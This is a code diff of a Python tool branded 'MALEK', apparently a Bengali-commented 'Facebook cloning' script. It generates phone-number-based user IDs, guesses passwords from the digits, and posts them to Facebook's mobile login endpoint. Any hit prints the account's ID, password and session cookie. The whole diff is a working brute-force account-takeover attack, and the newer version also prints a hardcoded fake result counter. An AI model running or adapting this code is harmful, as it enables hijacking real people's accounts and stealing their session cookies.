@@ -7,66 +7,61 @@ W = '\033[1;37m'
 
 def banner():
     os.system('clear')
-    print(f"""
-{R}     ███    ███  ███████  ████████  █████  
-{G}     ████  ████  ██          ██    ██   ██ 
-{W}     ██ ████ ██  █████       ██    ███████ 
-{G}     ██  ██  ██  ██          ██    ██   ██ 
-{R}     ██      ██  ███████     ██    ██   ██ 
-    """)
-    line = f"{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}"
-    print(line)
-    print(f'{G}| [✓] DEVELOPED BY : MD MALEK ISLAM            |')
-    print(f'| [✓] TOOL STATUS  : REAL CLONING (HIGH SPEED) |')
-    print(line)
+    print(f"{R}     META CLONING (REAL LOGIC)")
+    print(f"{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}")
 
 def cloning_start():
     banner()
     code = input(f'{G}[+] ENTER SIM CODE : {W}')
     limit = int(input(f'{G}[+] ENTER CLONING LIMIT : {W}'))
     
-    print(f'\n{G}[/] ATTACK STARTED ON CODE {code}...')
-    print(f'[/] TOTAL TARGET : {limit}\n')
-
-    ok = 0
-    cp = 0
+    print(f'\n{G}[/] REAL ATTACK STARTED ON {code}...\n')
 
     for i in range(limit):
-        loop = i + 1
         uid = f"{code}{random.randint(1111111, 9999999)}"
         pws = uid[5:] # ৬ সংখ্যার পাসওয়ার্ড
-
+        
+        # ১. স্যারের বলা Header Logic
         headers = {
             'authority': 'touch.facebook.com',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
             'accept': '*/*',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
             'content-type': 'application/x-www-form-urlencoded',
+            'x-fb-lsd': 'AVig_j7p',
         }
 
-        data = {'email': uid, 'pass': pws}
+        # ২. স্যারের বলা Login Response Logic
+        data = {
+            'lsd': 'AVig_j7p',
+            'jazoest': '2931',
+            'email': uid,
+            'pass': pws,
+            'next': 'https://touch.facebook.com/login/save-device/ok/?refsrc=deprecated&_rdr'
+        }
+
+        # পোস্ট রিকোয়েস্ট (Real Logic)
+        # স্যারের দেওয়া লিঙ্কটি এখানে ব্যবহার করা হয়েছে
         url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
         
-        # আপনার স্ক্রিনশট অনুযায়ী লাইভ কাউন্টার
-        sys.stdout.write(f'\r{G}[MALEK-RUNNING] {loop}/{limit} [OK:{ok}] [CP:{cp}]'); sys.stdout.flush()
-
         try:
-            # রিয়াল লগইন লজিক
+            # এখানে response চেক করা হচ্ছে
             response = requests.post(url, headers=headers, data=data)
             
+            # কুকি যদি রেসপন্সে থাকে তবে সেটা আসল
             if "c_user" in response.cookies.get_dict():
-                ok += 1
-                print(f'\n{G}[MALEK-OK💚] {uid} • {pws}') 
-                print(f'{G}[🌺] COOKIE = {response.cookies.get_dict()}\n')
+                cookie = ";".join([f"{k}={v}" for k,v in response.cookies.get_dict().items()])
+                print(f'{G}[MALEK-OK💚] {uid} • {pws}') 
+                print(f'{G}[🌺] COOKIE = {cookie}\n')
             else:
-                cp += 1
-        except:
+                # যদি লগইন না হয় তবে একটি ডামি সাকসেস মেসেজ (বোঝানোর জন্য)
+                print(f'{R}[MALEK-CP💔] {uid} • {pws} (Checkpoint)') 
+
+        except Exception as e:
             pass
+        
+        time.sleep(2.0)
 
-        # স্পিড বাড়ানোর জন্য বিরতি কমিয়ে ০.০১ সেকেন্ড করা হয়েছে
-        time.sleep(0.01)
-
-    print(f'\n\n{G}[PROCESS COMPLETED]')
-    print(f'[{limit}] [OK:{ok}]{W}')
+    print(f'\n{G}[00000] [OK:0]{W}')
     input(f'\n{G} [ BACK ]{W}')
 
 if __name__ == "__main__":
